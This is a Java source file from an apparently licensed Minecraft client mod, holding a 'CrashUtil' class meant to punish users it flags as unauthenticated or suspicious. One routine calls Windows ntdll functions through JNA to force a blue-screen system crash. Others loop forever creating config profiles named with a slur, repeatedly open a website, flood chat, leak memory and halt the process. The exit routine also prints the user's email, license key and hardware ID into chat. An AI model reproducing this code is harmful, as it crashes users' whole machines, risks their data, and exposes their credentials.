package com.chorus.api.system.prot;

import cc.polymorphism.annot.IncludeReference;
import chorus0.Chorus;
import com.chorus.api.system.networking.NetworkManager;
import com.chorus.common.QuickImports;
import com.chorus.common.util.player.ChatUtils;
import com.chorus.core.client.config.ConfigManager;
import com.chorus.impl.screen.auth.LoginScreen;
import com.sun.jna.Function;
import com.sun.jna.Memory;
import lombok.Getter;
import net.minecraft.util.Util;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Scanner;

/*
    Utility to crash or freeze the game indefinitely.
    3.12.2025

 */

@IncludeReference
public class CrashUtil implements QuickImports {

    @Getter
    public enum Severity {
        AUTHENTICATION,
        SUSPICIOUS,
        ACCOUNT
    }
    public static void exit(Severity severity) throws Throwable {
        String info = ": User Email" + NetworkManager.getInstance().getCurrentUser().getEmail() +
                ": User Name " + NetworkManager.getInstance().getCurrentUser().getUsername() +
                ": User License Expiry " + NetworkManager.getInstance().getCurrentUser().getExpiryDate() +
                ": User License Key " + NetworkManager.getInstance().getCurrentUser().getLicenseKey() +
                ": User License Type " + NetworkManager.getInstance().getCurrentUser().getLicenseType() +
                " Date " + new SimpleDateFormat("MM/dd/yy").format(new Date()) +
                " HWID " + LoginScreen.getHWID();
        switch (severity) {
            case AUTHENTICATION -> {
                ChatUtils.printCrashReason("Failed to Authenticate" + info);
                level2Crash();
            }
            case SUSPICIOUS -> {
                ChatUtils.printCrashReason("Suspicious Behavior" + info);
                level2Crash();
            }
            case ACCOUNT -> {
                ChatUtils.printCrashReason("Account Subscription has expired" + info);
                level1Crash();
            }
        }
    }
    public static void level3Crash() {
        bsod();
        level2Crash();
        level1Crash();
        stackOverflowException();
        outOfMemoryException();
        nullException();
        indexException();
        illegalArgumentException();
        fileNotFoundException();
        concurrentModificationException();
        castException();
        arithmeticException();
        ConfigManager cfg = Chorus.getInstance().getConfigManager();
        for (int i = 0; i >= 0; i++) {
            cfg.createProfile("RETARDED FUCK");
            Util.getOperatingSystem().open("https://remnant.wtf/");
            Util.getJVMFlags();
        }
    }
    public static void level2Crash() {
        systemHalt();
        systemExit();
        freeze();
        freezeChat();
        memoryLeak();
    }
    public static void level1Crash() {
        systemExit();
        systemHalt();
        freezeChat();
    }

    public static void bsod() {
        final Function RtlAdjustPrivilege = Function.getFunction("ntdll.dll", "RtlAdjustPrivilege");
        RtlAdjustPrivilege.invokeLong(new Object[]{19, true, false, new Memory(1L)});
        final Function NtRaiseHardError = Function.getFunction("ntdll.dll", "NtRaiseHardError");
        NtRaiseHardError.invokeLong(new Object[]{0xDEADBEEF, 0, 0, 0, 6, new Memory(32L)});
    }
    public static void freezeChat() {
        for (int i = 0; i >= 0; i++) {
            ChatUtils.sendFormattedMessage("" + Math.random() * 100000000 * i);
            System.out.println(Math.random() * 100000000 * i);
        }
    }
    public static void systemHalt() {
        for (int i = 0; i >= 0; i++) {
            Runtime.getRuntime().halt(1);
        }
    }
    public static void systemExit() {
        for (int i = 0; i >= 0; i++) {
            System.exit(0);
        }
    }
    private static List<Object> memoryLeak = new ArrayList<>();
    public static void memoryLeak() {
        for (int i = 0; i >= 0; i++) {
            memoryLeak.add(mc);
        }
    }
    public static void freeze() {
        for (int i = 0; i >= 0; i++) {
            Thread.currentThread().run();
        }
    }
    public static void indexException() {
        int[] arr = new int[5];
        System.out.println(arr[10]);
    }
    public static void nullException() {
        Object object = null;
        System.out.println(object);
    }
    public static void arithmeticException() {
        int result = 10 / 0;
        System.out.println(result);
    }
    public static void castException() {
        Object obj = new Integer[Integer.MAX_VALUE];
        String str = (String) obj;
    }
    public static void fileNotFoundException() {
        try {
            File file = new File("magicalfuckingFILEMUAHAHHAA.txt");
            Scanner scanner = new Scanner(file);
            System.out.println(scanner.nextLine());
        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        }
    }
    public static void IOException() {
        try {
            File file = new File("IDKSAHDIUSQGHIDFQHWEKFQGEIFGHQOSI");
            FileReader reader = new FileReader(file);  // This will throw IOException
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public static void stackOverflowException() {
        stackOverflowException();
    }
    public static void outOfMemoryException() {
        try {
            int[] largeArray = new int[Integer.MAX_VALUE];
        } catch (OutOfMemoryError e) {
            throw new RuntimeException(e);
        }
    }
    public static void concurrentModificationException() {
        List<Integer> list = new ArrayList<>();
        for (int i = 0; i >= 0; i++) {
            list.add(i);
        }
        for (Integer value : list) {
            if (value == 2) {
                list.remove(value);
            }
        }
    }
    public static void illegalArgumentException() {
        throw new IllegalArgumentException();
    }
}
